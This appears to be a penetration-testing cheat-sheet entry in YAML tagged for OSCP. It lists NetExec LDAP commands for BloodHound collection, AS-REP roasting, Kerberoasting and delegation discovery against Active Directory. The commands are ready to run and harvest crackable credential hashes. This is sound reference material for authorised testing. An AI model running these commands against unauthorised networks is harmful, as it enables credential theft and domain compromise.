---
variants:
  - label: bloodhound
    command: |
      nxc ldap $IP -u $USER -p $PASSWORD --bloodhound -c All --dns-server $DCIP
  - label: asreproast
    command: |
      nxc ldap $IP -u $USER -p $PASSWORD --asreproast asrep.txt
  - label: kerberoast
    command: |
      nxc ldap $IP -u $USER -p $PASSWORD --kerberoasting kerb.txt
  - label: delegation
    command: |
      nxc ldap $IP -u $USER -p $PASSWORD --find-delegation
description: NetExec over LDAP for BloodHound collection, roasting, and delegation discovery
os: [Linux]
category: [oscp, cli]
service: [LDAP, AD]
phase: [Enumeration, CredAccess]
references:
  - https://www.netexec.wiki/
---
